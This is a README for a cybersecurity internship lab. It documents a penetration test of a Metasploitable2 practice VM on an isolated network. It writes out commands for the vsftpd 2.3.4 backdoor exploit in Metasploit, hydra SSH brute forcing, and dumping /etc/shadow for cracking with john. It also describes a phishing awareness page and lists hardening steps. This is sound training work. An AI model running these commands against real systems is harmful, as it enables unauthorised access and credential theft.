# Task 4 — Exploitation & System Security
**ApexPlanet Cybersecurity & Ethical Hacking Internship (Days 37–48)**

This repository documents a controlled penetration test performed entirely within a private VirtualBox Host-Only lab network, using Kali Linux as the attacker machine and Metasploitable2 (an intentionally vulnerable practice VM) as the target. No systems outside this isolated lab were accessed.

## 📁 Repository Structure
```
task4-exploitation/
├── README.md                     ← this file
├── report/
│   └── Pentest_Report_Task4.pdf  ← full report (see /report)
├── screenshots/
│   ├── 01-recon-nmap-sV.png
│   ├── 02-recon-nmap-sS-allports.png
│   ├── 03-vsftpd-exploit-root-shell.png
│   ├── 04-postexploit-passwd-shadow-dump.png
│   ├── 05-john-cracked-hashes.png
│   ├── 06-hydra-ssh-sshconfig-error.png
│   ├── 07-hydra-ssh-success.png
│   ├── 08-sample-script-baseline.png
│   ├── 09-strace-install.png
│   ├── 10-strace-syscalls-1.png
│   ├── 11-strace-full-run.png
│   ├── 12-strace-syscalls-end-plus-nmap-sV-full.png
│   ├── 13-ssh-login-success-target-shell.png
│   └── 14-phishing-simulation-page.png
├── scripts/
│   ├── recon.sh                  ← nmap commands used
│   └── harden.sh                 ← hardening commands applied
└── notes/
    └── mitigations.md            ← per-finding fix summary
```

## 🎯 Objective
Learn the penetration testing workflow — Recon → Scanning → Exploitation → Post-Exploitation → Reporting — and practice exploiting vulnerabilities responsibly in a disposable lab environment.

## 🧪 Lab Setup
| Role | VM | IP |
|---|---|---|
| Attacker | Kali Linux | 192.168.187.3 |
| Target | Metasploitable2 | 192.168.187.4 |
| Network | VirtualBox Host-Only Adapter (no internet bridging) | 192.168.187.0/24 |

## 🔓 Exploitation Steps (Summary)

### 1. vsftpd 2.3.4 Backdoor → Root Shell
```bash
nmap -sV -p 21 192.168.187.4
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.187.4
run
```
Result: Direct root shell with no authentication required.

### 2. SSH Brute Force
```bash
hydra -l msfadmin -P ~/sshlist.txt ssh://192.168.187.4
```
Result: Valid credentials recovered (`msfadmin:msfadmin`), confirmed with a direct `ssh msfadmin@192.168.187.4` login.

### 3. Password Hash Dump & Cracking
```bash
# From the root shell obtained via the vsftpd backdoor (hashdump unavailable on this x86/linux payload):
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show combined.txt
```
Result: 3 of 7 password hashes cracked offline (`klog`, `sys`, `service`).

### 4. Phishing Simulation (Awareness Only)
A static, locally-hosted HTML page mimicking a generic login form was built purely to demonstrate phishing indicators for a training walkthrough — no real credentials were collected and no real users were targeted.

## 🛡️ Mitigations Applied
See [`notes/mitigations.md`](notes/mitigations.md) for the full list. Summary:
- Upgraded/removed vulnerable vsftpd version
- Enforced SSH key-based authentication, disabled password login
- Enforced strong password policy
- Applied `iptables` rules restricting exposed ports
- Disabled unused services
- Delivered a phishing-awareness checklist

## ⚠️ Disclaimer
This work was performed strictly against self-owned, intentionally vulnerable practice machines in an isolated lab network for educational purposes as part of a structured internship curriculum. None of the techniques here were used against systems the author does not own or have explicit authorization to test.
